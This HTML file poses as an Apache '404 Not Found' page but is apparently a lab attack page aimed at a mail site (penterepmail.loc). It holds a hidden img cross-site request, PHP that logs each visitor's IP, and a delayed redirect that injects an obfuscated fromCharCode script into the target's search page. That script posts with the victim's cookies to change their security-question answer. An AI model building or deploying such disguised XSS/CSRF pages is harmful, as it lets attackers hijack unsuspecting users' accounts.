<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<img src="http://www.penterepmail.loc/settings/resend?email=shell@penterepmail.loc">
<address>Apache/2.4.46 (Debian) Server at 10.0.2.15 Port 80</address>
<?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $file = fopen('questionchange.txt','a');
    fwrite($file, "IP of changed target: ".$ip."\n");
?>


<script>
setTimeout(function(){
var p = "<script>";
var k = String.fromCharCode(60,47,115,99,114,105,112,116,62);
var o = "eval(String.fromCharCode(118,97,114,32,120,104,114,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,104,114,46,111,112,101,110,40,39,80,79,83,84,39,44,39,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,115,101,116,116,105,110,103,115,47,112,97,115,115,99,104,97,110,103,101,39,44,116,114,117,101,41,59,10,120,104,114,46,119,105,116,104,67,114,101,100,101,110,116,105,97,108,115,32,61,32,116,114,117,101,59,10,120,104,114,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,67,111,110,116,101,110,116,45,84,121,112,101,39,44,32,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,39,41,59,10,120,104,114,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,65,99,99,101,115,115,45,67,111,110,116,114,111,108,45,65,108,108,111,119,45,79,114,105,103,105,110,39,44,39,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,39,41,59,10,120,104,114,46,115,101,110,100,40,39,113,117,101,115,116,105,111,110,61,51,38,97,110,115,119,101,114,61,54,57,39,41,59,10,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,123,10,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,34,104,116,116,112,58,47,47,49,48,46,48,46,50,46,49,48,47,105,110,99,47,115,101,97,114,99,104,46,112,104,112,63,113,117,101,114,121,61,107,97,114,101,108,34,41,59,10,125,44,50,48,48,48,41,59));";
window.location.replace("http://www.penterepmail.loc/inc/search.php?query=Karel"+p+o+k);

},3000);
</script>
</body></html>